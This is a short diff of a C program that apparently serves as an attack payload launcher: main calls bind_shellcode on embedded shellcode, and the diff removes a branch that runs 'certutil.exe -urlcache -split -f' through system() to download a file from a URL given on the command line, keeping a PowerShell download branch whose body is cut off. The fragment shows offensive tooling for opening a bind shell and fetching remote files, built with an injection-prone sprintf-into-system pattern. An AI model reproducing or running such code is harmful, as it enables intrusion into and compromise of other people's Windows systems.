@@ -64,19 +64,8 @@ int main (int argc, char **argv)
 	bind_shellcode(shellcode);
 	
 
-//#if defined(DOWNLOADCERTUTIL) || defined(DOWNLOADPOWERSHELL)
+//#if defined(DOWNLOADPOWERSHELL)
 //download a file and write to disk
-#ifdef DOWNLOADCERTUTIL
-	char download[500];  //how not to do it...
-	sprintf(download,"certutil.exe -urlcache -split -f %s",argv[2]);
-	#ifdef PRINT_DEBUG
-		printf("url: %s\n", download);
-	#endif
-	system(download);
-	#ifdef PRINT_DEBUG
-		printf("download done\n");
-	#endif
-#endif
 
 #ifdef DOWNLOADPOWERSHELL
 	char download[500];
